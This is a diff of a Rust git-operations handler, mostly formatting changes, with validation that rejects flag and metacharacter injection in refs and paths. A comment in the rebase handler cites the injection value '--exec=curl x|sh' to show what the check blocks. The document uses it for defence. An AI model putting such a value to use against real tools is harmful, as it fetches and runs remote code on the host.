@@ -53,18 +53,17 @@ struct GitRequest {
     paths: Option<Vec<String>>,
 
     // --- new fields for advanced operations ---
+    #[serde(default)]
+    target: Option<String>, // reset target / cherry-pick target
 
     #[serde(default)]
-    target: Option<String>,   // reset target / cherry-pick target
+    mode: Option<String>, // reset mode: "soft", "mixed" (default), "hard"
 
     #[serde(default)]
-    mode: Option<String>,     // reset mode: "soft", "mixed" (default), "hard"
+    onto: Option<String>, // rebase --onto target
 
     #[serde(default)]
-    onto: Option<String>,     // rebase --onto target
-
-    #[serde(default)]
-    commits: Option<Vec<String>>,  // cherry-pick commit hashes
+    commits: Option<Vec<String>>, // cherry-pick commit hashes
 }
 
 #[derive(Debug, Serialize)]
@@ -162,9 +161,7 @@ fn is_safe_ref(s: &str) -> Result<(), String> {
     }
     for ch in s.chars() {
         if !(ch.is_ascii_alphanumeric() || matches!(ch, '_' | '.' | '/' | '-')) {
-            return Err(format!(
-                "value contains disallowed character `{ch}`: {s}"
-            ));
+            return Err(format!("value contains disallowed character `{ch}`: {s}"));
         }
     }
     Ok(())
@@ -212,9 +209,9 @@ fn validate_path_in_root(root: &Path, rel: &str) -> Result<(), String> {
             let mut current = resolved.as_path();
             let existing = loop {
                 if current.exists() {
-                    break current.canonicalize().map_err(|e| {
-                        format!("failed to canonicalise existing ancestor: {e}")
-                    })?;
+                    break current
+                        .canonicalize()
+                        .map_err(|e| format!("failed to canonicalise existing ancestor: {e}"))?;
                 }
                 match current.parent() {
                     Some(parent) => {
@@ -385,7 +382,11 @@ fn handle_reset(req: &GitRequest) -> Result<GitResponse, String> {
     // Validate mode
     match mode {
         "soft" | "mixed" | "hard" => {}
-        other => return Err(format!("invalid reset mode: {other}. Use soft, mixed, or hard")),
+        other => {
+            return Err(format!(
+                "invalid reset mode: {other}. Use soft, mixed, or hard"
+            ))
+        }
     }
 
     // P0-18: reject anything that git could parse as a flag or that touches
@@ -427,7 +428,10 @@ fn handle_reset(req: &GitRequest) -> Result<GitResponse, String> {
 
 fn handle_rebase(req: &GitRequest) -> Result<GitResponse, String> {
     let root = resolve_root(req.fixtures_root.as_deref())?;
-    let onto = req.onto.as_deref().ok_or("rebase requires 'onto' parameter")?;
+    let onto = req
+        .onto
+        .as_deref()
+        .ok_or("rebase requires 'onto' parameter")?;
 
     // P0-18: block flag / metacharacter injection. Without this,
     // `--exec=curl x|sh` in `onto` would be treated as a rebase flag.
@@ -504,7 +508,10 @@ fn handle_amend(req: &GitRequest) -> Result<GitResponse, String> {
 
 fn handle_cherry_pick(req: &GitRequest) -> Result<GitResponse, String> {
     let root = resolve_root(req.fixtures_root.as_deref())?;
-    let commits = req.commits.as_deref().ok_or("cherry-pick requires 'commits' array")?;
+    let commits = req
+        .commits
+        .as_deref()
+        .ok_or("cherry-pick requires 'commits' array")?;
     if commits.is_empty() {
         return Err("commits must not be empty".to_string());
     }
